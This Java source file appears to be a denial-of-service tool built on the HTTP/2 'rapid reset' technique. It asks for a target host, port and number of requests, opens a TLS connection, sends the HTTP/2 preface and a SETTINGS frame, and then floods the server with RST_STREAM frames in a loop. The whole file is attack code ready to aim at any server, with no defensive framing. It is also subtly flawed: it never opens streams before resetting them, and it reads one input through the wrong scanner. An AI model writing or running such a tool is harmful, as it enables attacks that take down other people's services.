package de.Cooltechno;

import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import java.io.OutputStream;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {

        Scanner target = new Scanner(System.in);
        System.out.println("Enter the target ip/domain: ");
        String targetHost = target.nextLine();;

        Scanner Port = new Scanner(System.in);
        System.out.println("Enter The Port: ");
        int targetPort = Integer.parseInt(Port.nextLine());

        Scanner number = new Scanner(System.in);
        System.out.println("How Many Requests Do You Wanna Send: ");
        int NumberOfRequests = Integer.parseInt(Port.nextLine());

        try {
            // Create an SSL socket to the target host
            SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
            try (SSLSocket socket = (SSLSocket) factory.createSocket(targetHost, targetPort)) {
                // Start the SSL handshake
                socket.startHandshake();

                OutputStream out = socket.getOutputStream();

                // Send the HTTP/2 connection preface
                out.write("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n".getBytes());
                out.flush();

                // Send a SETTINGS frame
                byte[] settingsFrame = new byte[]{
                        0x00, 0x00, 0x00, // Length
                        0x04,             // Type (SETTINGS)
                        0x00,             // Flags
                        0x00, 0x00, 0x00, 0x00  // Stream ID
                };
                out.write(settingsFrame);
                out.flush();

                // Simulate rapid reset abuse
                for (int i = 0; i < NumberOfRequests; i++) {
                    // Create a RST_STREAM frame
                    byte[] resetFrame = new byte[]{
                            0x00, 0x00, 0x04, // Length
                            0x03,             // Type (RST_STREAM)
                            0x00,             // Flags
                            0x00, 0x00, 0x00, 0x01, // Stream ID
                            0x00, 0x00, 0x00, 0x00  // Error Code (NO_ERROR)
                    };
                    out.write(resetFrame);
                    out.flush();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}